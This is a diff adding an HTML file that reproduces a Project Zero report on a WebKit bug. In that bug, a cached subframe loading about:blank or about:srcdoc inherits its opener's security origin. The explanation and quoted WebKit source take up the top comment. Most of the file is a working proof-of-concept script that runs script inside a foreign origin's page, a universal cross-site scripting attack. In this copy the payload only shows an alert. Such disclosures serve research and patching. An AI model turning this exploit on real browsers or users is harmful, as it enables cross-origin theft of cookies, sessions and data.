@@ -1,0 +1,89 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1176
+
+When a document loads "about:blank" or "about:srcdoc", it tries to inherit the security origin from its parent frame, or its opener frame if the parent frame doesn't exist. Normally, it doesn't happen that a subframe's document inherits its opener frame's security origin, because it has the parent frame. And it shouldn't happen at all. However, when the subframe is cached, only the parent frame is detached but not the opener frame. So, inheriting the opener frame's security origin could happen in that case.
+
+void Document::initSecurityContext()
+{
+    ...
+    if (!shouldInheritSecurityOriginFromOwner(m_url)) <<----- check m_url is about:blank or about:srcdoc.
+        return;
+
+    // If we do not obtain a meaningful origin from the URL, then we try to
+    // find one via the frame hierarchy.
+    Frame* parentFrame = m_frame->tree().parent();
+    Frame* openerFrame = m_frame->loader().opener();
+
+    Frame* ownerFrame = parentFrame;
+    if (!ownerFrame)
+        ownerFrame = openerFrame;
+
+    if (!ownerFrame) {
+        didFailToInitializeSecurityOrigin();
+        return;
+    }
+
+    ...
+    setCookieURL(ownerFrame->document()->cookieURL());
+    // We alias the SecurityOrigins to match Firefox, see Bug 15313
+    // https://bugs.webkit.org/show_bug.cgi?id=15313
+    setSecurityOriginPolicy(ownerFrame->document()->securityOriginPolicy());
+    ...
+}
+
+PoC:
+-->
+
+<body>
+Click anywhere.
+<script>
+
+window.onclick = () => {
+    window.onclick = null;
+
+    let w = open('about:blank', '', 'width=500, height=500');
+    w.eval(`
+let f = document.body.appendChild(document.createElement('iframe'));
+f.contentWindow.name = 'zzz';
+opener.open('about:blank', 'zzz');
+
+function navigate(w, url, cb = null) {
+    w.__check = true;
+
+    let a = w.document.createElement('a');
+    a.href = url;
+    a.click();
+
+    if (!cb)
+        return;
+
+    let it = setInterval(() => {
+        let navigated = false;
+        try {
+            if (!w.__check)
+                navigated = true;
+        } catch (e) {
+            navigated = true;
+        }
+
+        if (navigated) {
+            clearInterval(it);
+            cb();
+        }
+    }, 10);
+}
+
+navigate(opener, 'https://abc.xyz/', () => {
+    f.srcdoc = '<script>opener.alert(opener.location);</scrip' + 't>';
+    f.contentWindow.onbeforeunload = () => {
+        f.contentWindow.onbeforeunload = null;
+
+        navigate(window, 'about:blank');
+    };
+
+    navigate(f.contentWindow, 'about:srcdoc');
+});`);
+}
+
+</script>
+</body>
